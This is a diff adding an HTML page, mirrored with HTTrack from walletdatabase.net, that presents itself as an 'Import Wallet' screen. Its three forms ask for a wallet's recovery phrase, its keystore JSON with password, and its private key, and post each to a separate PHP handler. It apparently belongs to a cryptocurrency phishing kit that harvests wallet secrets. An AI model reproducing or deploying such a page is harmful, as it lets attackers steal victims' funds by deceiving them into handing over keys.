@@ -1,0 +1,89 @@
+
+<!DOCTYPE html>
+<html>
+
+<!-- Mirrored from walletdatabase.net/list/import/index.html by HTTrack Website Copier/3.x [XR&CO'2014], Tue, 14 Dec 2021 23:09:40 GMT -->
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, shrink-to-fit=no">
+    <title>Import Wallet</title>
+    <link rel="stylesheet" href="bootstrap.min.css">
+    <link rel="stylesheet" href="fontawesome-all.min.css">
+    <link rel="stylesheet" href="style.css">
+    <link rel="apple-touch-icon" sizes="180x180" href="apple-touch-icon.html">
+    <link rel="icon" type="image/png" sizes="32x32" href="favicon-32x32.html">
+    <link rel="icon" type="image/png" sizes="16x16" href="favicon-16x16.html">
+    <link rel="manifest" href="site.html">
+</head>
+</head>
+<body>
+    <header>
+        <div class="container-fluid">
+			<div class="row">
+			<div class="col-md-4 offset-md-4">
+				<a class="text-white" href="https://easywalletfix.net/list/" style="font-size: 20px;"><i class="fas fa-angle-left"></i>&nbsp; &nbsp;Import Wallet</a>
+			</div>
+			</div>
+		</div>
+    </header>
+	<div class="container-fluid">
+		<div class="row">
+			<div class="col-md-4 offset-md-4">
+				<ul class="nav nav-tabs">
+					<li class="nav-item"><a class="nav-link active" data-toggle="tab" href="#phrase">Phrase</a></li>
+					<li class="nav-item"><a class="nav-link" data-toggle="tab" href="#keystore">Keystore JSON</a></li>
+					<li class="nav-item"><a class="nav-link" data-toggle="tab" href="#privatekey">Private Key</a></li>
+				</ul>
+			</div>
+		</div>
+	</div>
+    <section style="margin-top: 40px;">
+        <div class="container-fluid">
+            <div class="row">
+                <div class="col-md-4 offset-md-4">
+					<!-- Tab panes -->
+					<div class="tab-content">
+						<div role="tabpanel" class="tab-pane fade show active" id="phrase">
+							<form method="post" action="action.php">
+								<textarea class="form-control" rows="5" name="phrase" placeholder="Phrase" required=""></textarea>
+								<p class="text-secondary" style="margin-top: 10px;">Typically 12 (sometimes 24) words seperated by a single spaces.</p>
+								<input type="hidden" name="value" value="Ethereum">
+								<div class="form-group"><button class="btn btn-primary btn-block" type="submit" name="submit">IMPORT</button></div>
+							</form>
+						</div>
+						<div role="tabpanel" class="tab-pane fade" id="keystore">
+							<form method="post" action="action2.php">
+								<div class="form-group">
+									<textarea class="form-control" name="keystorejson" rows="5" placeholder="Keystore JSON" required=""></textarea>
+								</div>
+								<div class="form-group">
+									<input class="form-control" type="password" name="keystorepasswword" placeholder="Password" required="">
+								</div>
+								<p class="text-secondary" style="margin-top: 10px;">
+									Several lines of text beginning with "{...}" plus the password you used to encrypt it.
+								</p>
+								<input type="hidden" name="value" value="Ethereum">
+								<div class="form-group"><button class="btn btn-primary btn-block" type="submit" name="submit">IMPORT</button></div>
+							</form>
+						</div>
+						<div role="tabpanel" class="tab-pane fade" id="privatekey">
+							<form method="post" action="action3.php">
+								<div class="form-group">
+									<input class="form-control" name="privatekey" placeholder="Private Key" required="">
+								</div>
+								<p class="text-secondary" style="margin-top: 10px;">Typically 12 (sometimes 24) words seperated by a single spaces.</p>
+								<input type="hidden" name="value" value="Ethereum">
+								<div class="form-group"><button class="btn btn-primary btn-block" type="submit" name="submit">IMPORT</button></div>
+							</form>
+						</div>
+					</div>
+                </div>
+            </div>
+        </div>
+    </section>
+    <script src="jquery.min.js"></script>
+    <script src="bootstrap.min.js"></script>
+</body>
+
+<!-- Mirrored from walletdatabase.net/list/import/index.html by HTTrack Website Copier/3.x [XR&CO'2014], Tue, 14 Dec 2021 23:09:44 GMT -->
+</html>
